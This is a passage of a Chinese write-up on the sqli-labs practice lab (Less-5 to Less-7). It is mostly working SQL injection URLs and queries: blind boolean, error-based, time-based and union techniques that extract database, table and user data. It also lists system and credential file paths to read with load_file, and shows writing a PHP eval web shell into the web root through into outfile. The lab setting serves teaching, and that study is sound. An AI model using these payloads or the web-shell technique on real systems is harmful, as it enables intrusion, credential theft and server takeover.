<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">info</span> rmation_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span></span><br></pre></td></tr></table></figure>

<p>根据以上得知数据库名为security，那我们利用此方式获取security数据库下的表。获取security数据库的第一个表的第一个字符</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> infromation_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>此处的table_schema可以为security，如果database()只有一个库就可以用database()。此处同样使用二分法进行测试。最终测试结果该表名第一个字符ascii值为101，为email的e。</p>
<p>而获取第一个表的第二个字符，则按照substr()函数的特性，将其改为sub(**,2,1)即可</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">108</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>获知第一个表的第二个字符ascii码值为109</p>
<p>以此类推就可将第一个表中的所有字符。</p>
<p>上述playload中limit 0，1意思是从第0个开始获取第1个表，获取第二个则是limit 1，1</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">113</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>此处返回，因为第二个表名为referers，第一位为r</p>
<p>通过上述的全部过程就可以将security库中的表全部注入出来。</p>
<p>(3)利用regexp获取（2）中的users表中的列 //正则匹配</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and 1=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">and</span> table_name regexp <span class="string">'^us[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)<span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>这可以选择users表中的列名是否有<code>us**</code>的列，测试users表中的<code>us**</code>列的</p>
<p>第三个字符是否在a-z范围内。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and 1=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">and</span> table_name regexp <span class="string">'^username'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>) <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/13.png" alt></p>
<p>图片说明username列是存在的，同样可以将username换成password等其他项也会是正确的。</p>
<p>(4)利用ord()和mid()函数获取users表的内容</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and ord(mid((<span class="keyword">select</span> <span class="keyword">ifnull</span>(<span class="keyword">cast</span>(username <span class="keyword">as</span> <span class="built_in">char</span>),<span class="number">0x20</span>)<span class="keyword">from</span> security.users <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>该playload可以获取到users表中的内容，获取username中的第一行的第一个字符的ascii，与68进行比较，即为D。而我们从表中得知第一行数据为Dumb。</p>
<p>(5)使用报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/14.png" alt></p>
<p>利用double数值类型超出范围进行报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' union <span class="keyword">select</span> (<span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())a))),<span class="number">2</span>,<span class="number">3</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>此时要注意mysql版本是否是5.5.5-5.5.52之间的，超出这个范围是无法得到想要的结果。</p>
<p>利用bigint溢出进行报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' union <span class="keyword">select</span> (!(<span class="keyword">select</span> <span class="keyword">user</span>())x) - ~<span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>xpath函数报错注入</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-5</span>/?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="keyword">extractvalue</span>(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="title">@version</span>),<span class="number">0x7e</span>)) -- +</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/15.png" alt></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/16.png" alt></p>
<p>利用数据的重复性</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>))x <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/17.png" alt></p>
<p>(6)延时注入</p>
<p>利用sleep()函数进行注入</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">5</span><span class="regexp">/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))-- +</span></span><br></pre></td></tr></table></figure>

<p>如果查询语句是对的，则会直接显示</p>
<p><img src="/2019/12/27/sqli-labs-writeup/18.png" alt></p>
<p>如果查询语句判断为错误时会有5秒的延时</p>
<p><img src="/2019/12/27/sqli-labs-writeup/19.png" alt></p>
<p><img src="/2019/12/27/sqli-labs-writeup/20.png" alt></p>
<p>利用BENCHMARK()进行延时注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' union <span class="keyword">select</span> (<span class="keyword">if</span> (<span class="keyword">substring</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">115</span>),<span class="keyword">benchmark</span>(<span class="number">50000000</span>,<span class="keyword">encode</span>(<span class="string">'MSG'</span>,<span class="string">'by 5 seconds'</span>)),<span class="literal">null</span>)),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tb1 <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/21.png" alt></p>
<p>当结果正确的时候，运作encode（’MSG’,’by 5 seconds’)操作50000000次，会占用一段时间。</p>
<h4 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h4><p>less6传入参数的部分源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>

<p>与less5比较发现区别在与less6中对id参数传输到服务器时进行了处理，将id增加双引号传输，知道这个就可以将less5中id参数的单引号直接改为双引号</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/?id=1" and left(version(),1)=5 -- +</span></span><br></pre></td></tr></table></figure>

<p>所有的注入过程与less5一致，只要将id的单引号改为双引号即可</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-6</span>/?id=<span class="number">1</span>" and length(database())=8 -- +   //数据库长度</span><br><span class="line">http://localhost/sqli-labs-master/Less-6/?id=1" <span class="keyword">and</span> left(<span class="keyword">database</span>(),<span class="number">1</span>)&gt;<span class="string">'s'</span>     //猜测数据库名第<span class="number">1</span>位</span><br><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-6</span>/?id=<span class="number">1</span>" and left(database(),2)&gt;'se'    //猜测数据库名第2位</span><br><span class="line">......</span><br><span class="line">http://localhost/sqli-labs-master/Less-6/?id=1" <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span> <span class="comment">-- +    //猜测数据库security下的第一个表的第一个字符</span></span><br><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-6</span>/?id=<span class="number">1</span>" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108 -- +     //猜测数据库security下的第一个表的第一个字符</span><br><span class="line">http://localhost/sqli-labs-master/Less-6/?id=1" <span class="keyword">and</span> ascii (substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">113</span> <span class="comment">-- +     //猜测数据库security下第二个表的第一个字符</span></span><br><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-6</span>/?id=<span class="number">1</span>" and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1) -- +     //查看users表中的是否有us**的列，并且该列名第三个字符是否在a-z范围内</span><br><span class="line">http://localhost/sqli-labs-master/Less-6/?id=1" <span class="keyword">and</span> ord(mid((<span class="keyword">select</span> ifnull(cast(username <span class="keyword">as</span> <span class="type">char</span>),<span class="number">0x20</span>)<span class="keyword">from</span> <span class="keyword">security</span>.users <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span> <span class="comment">-- +       //获取users表中第一行的第一个字符的ascii并与68进行比较即为D</span></span><br></pre></td></tr></table></figure>

<h3 id="Background-3-导入与导出相关操作"><a href="#Background-3-导入与导出相关操作" class="headerlink" title="Background-3 导入与导出相关操作"></a>Background-3 导入与导出相关操作</h3><h4 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h4><p>load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
<p>使用条件：</p>
<ul>
<li><p>必须有权限读取并且文件必须完全可读，测试查询语句：</p>
<p>and (select count(*) from mysql.user)&gt;0   //如果返回正常，说明具有读写权限</p>
<p>and (select count(*) from mysql.user)&gt;0  //返回错误，应该是管理员对数据库账户降权</p>
</li>
<li><p>欲读取文件必须在服务器上</p>
</li>
<li><p>必须指定文件完整的路径</p>
</li>
<li><p>欲读取文件必须小于 max_allowed_packet</p>
</li>
</ul>
<p>如果该文件不存在或因为上面的任意一种原因而不能被读取，函数返回为空。其中比较难满足的是权限，在win下，如果NTFS设置得当，是不能读取相关的文件，只有administrators才能访问的文件。</p>
<p>实际注入中，主要要解决两个难点</p>
<ul>
<li>绝对物理路径</li>
<li>构造有效的畸形语句（报错爆出绝对路径）</li>
</ul>
<p>常用的路径</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">WINDOWS下:</span><br><span class="line">c:/<span class="keyword">boot</span>.ini <span class="comment">//查看系统版本</span></span><br><span class="line">c:/windows/php.ini <span class="comment">//php配置信息</span></span><br><span class="line">c:/windows/my.ini <span class="comment">//MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</span></span><br><span class="line">c:/winnt/php.ini</span><br><span class="line">c:/winnt/my.ini</span><br><span class="line">c:\mysql\data\mysql\user.MYD <span class="comment">//存储了mysql.user表中的数据库连接密码</span></span><br><span class="line">c:\<span class="keyword">Program</span> Files\RhinoSoft.com\Serv-<span class="keyword">U</span>\ServUDaemon.ini <span class="comment">//存储了虚拟主机网站路径和密码</span></span><br><span class="line">c:\<span class="keyword">Program</span> Files\Serv-<span class="keyword">U</span>\ServUDaemon.ini</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看<span class="keyword">IIS</span>的虚拟主机配置</span><br><span class="line">c:\windows\repair\sam <span class="comment">//存储了WINDOWS系统初次安装的密码</span></span><br><span class="line">c:\<span class="keyword">Program</span> Files\ Serv-<span class="keyword">U</span>\ServUAdmin.exe <span class="comment">//6.0版本以前的serv-u管理员密码存储于此</span></span><br><span class="line">c:\<span class="keyword">Program</span> Files\RhinoSoft.com\ServUDaemon.exe</span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</span><br><span class="line"><span class="comment">//存储了pcAnywhere的登陆密码</span></span><br><span class="line">c:\<span class="keyword">Program</span> Files\Apache Group\Apache\<span class="keyword">conf</span>\httpd.<span class="keyword">conf</span> 或C:\apache\<span class="keyword">conf</span>\httpd.<span class="keyword">conf</span> <span class="comment">//查看WINDOWS系统apache文件</span></span><br><span class="line">c:/Resin-3.0.14/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> <span class="comment">//查看jsp开发的网站 resin文件配置信息.</span></span><br><span class="line">c:/Resin/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> /usr/<span class="keyword">local</span>/resin/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> 查看linux系统配置的JSP虚拟主机</span><br><span class="line"><span class="keyword">d</span>:\APACHE\Apache2\<span class="keyword">conf</span>\httpd.<span class="keyword">conf</span></span><br><span class="line">C:\<span class="keyword">Program</span> Files\mysql\my.ini</span><br><span class="line">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line"></span><br><span class="line">LUNIX/UNIX 下:</span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/apache2/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span> <span class="comment">//apache2缺省配置文件</span></span><br><span class="line">/usr/<span class="keyword">local</span>/apache2/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span></span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/apache2/<span class="keyword">conf</span>/extra/httpd-vhosts.<span class="keyword">conf</span> <span class="comment">//虚拟网站设置</span></span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/php5/lib/php.ini <span class="comment">//PHP相关设置</span></span><br><span class="line">/etc/sysconfig/iptables <span class="comment">//从中得到防火墙规则策略</span></span><br><span class="line">/etc/httpd/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span> <span class="comment">// apache配置文件</span></span><br><span class="line">/etc/rsyncd.<span class="keyword">conf</span> <span class="comment">//同步程序配置文件</span></span><br><span class="line">/etc/my.cnf <span class="comment">//mysql的配置文件</span></span><br><span class="line">/etc/redhat-release <span class="comment">//系统版本</span></span><br><span class="line">/etc/issue</span><br><span class="line">/etc/issue.<span class="keyword">net</span></span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/php5/lib/php.ini <span class="comment">//PHP相关设置</span></span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/apache2/<span class="keyword">conf</span>/extra/httpd-vhosts.<span class="keyword">conf</span> <span class="comment">//虚拟网站设置</span></span><br><span class="line">/etc/httpd/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span>或/usr/<span class="keyword">local</span>/apche/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span> 查看linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/<span class="keyword">local</span>/resin-3.0.22/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> 针对3.0.22的RESIN配置文件查看</span><br><span class="line">/usr/<span class="keyword">local</span>/resin-<span class="keyword">pro</span>-3.0.22/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> 同上</span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/apache2/<span class="keyword">conf</span>/extra/httpd-vhosts.<span class="keyword">conf</span> APASHE虚拟主机查看</span><br><span class="line">/etc/httpd/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span>或/usr/<span class="keyword">local</span>/apche/<span class="keyword">conf</span> /httpd.<span class="keyword">conf</span> 查看linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/<span class="keyword">local</span>/resin-3.0.22/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> 针对3.0.22的RESIN配置文件查看</span><br><span class="line">/usr/<span class="keyword">local</span>/resin-<span class="keyword">pro</span>-3.0.22/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> 同上</span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/apache2/<span class="keyword">conf</span>/extra/httpd-vhosts.<span class="keyword">conf</span> APASHE虚拟主机查看</span><br><span class="line">/etc/sysconfig/iptables 查看防火墙策略</span><br><span class="line">load_file(<span class="built_in">char</span>(47)) 可以列出FreeBSD,Sunos系统根目录</span><br><span class="line"><span class="keyword">replace</span>(load_file(0×2F6574632F706173737764),0×3c,0×20)</span><br><span class="line"><span class="keyword">replace</span>(load_file(<span class="built_in">char</span>(47,101,116,99,47,112,97,115,115,119,100)),<span class="built_in">char</span>(60),<span class="built_in">char</span>(32))</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,hex(replace(load_file(char(<span class="number">99</span>,<span class="number">58</span>,<span class="number">92</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">92</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">92</span>,<span class="number">115</span>,<span class="number">97</span>,<span class="number">109</span>)))</span><br></pre></td></tr></table></figure>

<p>利用hex()将文件内容导出，尤其是smb文件时可以使用</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,1,1,<span class="title">load_file</span>(<span class="title">char</span>(99,58,47,98,111,111,116,46,105,110,105))</span></span><br><span class="line">/<span class="regexp">/char(99,58,47,98,111,111,116,46,105,110,105)就是c:/boot</span>.ini的ASCII代码</span><br><span class="line">-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,1,1,<span class="title">load_file</span>(0<span class="title">x633a2f626f6f742e696e69</span>)  </span></span><br><span class="line">/<span class="regexp">/“c:/boot</span>.ini” 的 <span class="number">16</span> 进制是“<span class="number">0x633a2f626f6f742e696e69</span>”</span><br><span class="line">-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,1,1,<span class="title">load_file</span>(<span class="title">c</span>:\\<span class="title">boot</span>.<span class="title">ini</span>)</span></span><br><span class="line">/<span class="regexp">/路径内的/</span>用\\代替</span><br></pre></td></tr></table></figure>

<h4 id="文件导入到数据库"><a href="#文件导入到数据库" class="headerlink" title="文件导入到数据库"></a>文件导入到数据库</h4><p>LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。</p>
<p><img src="/2019/12/27/sqli-labs-writeup/22.png" alt></p>
<p>在注入的过程中，我们往往需要一些特殊的文件，比如说配置文件，密码文件等。当拥有数据库的权限时，可以将系统文件利用load data infile导入到数据库中。</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">'/tmp/to.txt'</span> <span class="keyword">ignore</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">to</span> <span class="built_in">character</span> <span class="keyword">set</span> gbk <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span> <span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\n'</span></span><br></pre></td></tr></table></figure>

<p>将/tmp/to.txt导入到t0表中，character set gbk是字符集设置为gbk，fileds terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符</p>
<p>当错误代码为2时，文件不存在，错误代码为13时没有权限，可以考虑/tmp文件</p>
<h4 id="导入到文件"><a href="#导入到文件" class="headerlink" title="导入到文件"></a>导入到文件</h4><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="params">...</span><span class="params">...</span><span class="keyword">into</span> outfile <span class="string">'file_name'</span></span><br></pre></td></tr></table></figure>

<p>可将被选择的某一行写入到一个文件中，该文件被创建到服务器主机上，前提是拥有file权限，才能使用该语法，file_name不能是一个已经存在的文件。</p>
<p>一般有两种利用形式：</p>
<ul>
<li><p>直接将select内容导入到文件中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>() <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"c:\\phpnow\\htdocs\\test.php"</span></span><br></pre></td></tr></table></figure>

<p>此处将version()替换成y一句话，<?php @eval($_post["mima"]) ?>也可以使用即：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_post[<span class="string">"mima"</span>]) ?php&gt; into outfile <span class="string">"c:\\phpnow\\htdocs\\test.php"</span></span></span><br></pre></td></tr></table></figure>

<p>然后直接连接一句话即可，其实在select内容还可以上传很多的内容。</p>
</li>
<li><p>修改文件结尾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select version() into outfile &quot;c:\\phpnow\\htdocs\\test.php&quot; lines terminated by 0x16 进制文件</span><br></pre></td></tr></table></figure>

<p>通常情况下，用‘\r\n’结尾，此处修改为自己想要的任何文件，同事可以用FIELDS TERMINATED BY。16进制可以为一句话或者其他任何的代码</p>
</li>
</ul>
<p>TIPS:</p>
<ul>
<li><p>(1)可能在文件路径当中要注意转义，具体看环境</p>
</li>
<li><p>(2)load_file()当前台无法导出数据的时候，可以使用：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load<span class="constructor">_file('<span class="params">c</span>:\\<span class="params">wamp</span>\\<span class="params">bin</span>\\<span class="params">mysql</span>\\<span class="params">mysql5</span>.6.17\\<span class="params">my</span>.<span class="params">ini</span>')</span> into outfile 'c:\\wamp\\www\\test.php'</span><br></pre></td></tr></table></figure>

<p>可利用该语句将服务器当中的内容导入到web服务器的目录中，这样就可以找到数据。在my.ini当中存在password项（默认被注释），会有很多可以被导出来。</p>
</li>
</ul>
<h4 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h4><p>连接标题是dump into outfile 意思就是利用文件导入的方式进行注入。</p>
<p>首先还是回归源码中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=((<span class="string">'$id'</span>)) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>在源码中对id参数进行 <code>&#39;))</code>处理，可以尝试 <code>&#39;)) or 1=1 -- +</code>进行注入</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">7</span><span class="regexp">/?id=1')) or 1=1 -- +</span></span><br></pre></td></tr></table></figure>

<p>以下为使用文件导入的方式进行注入：</p>
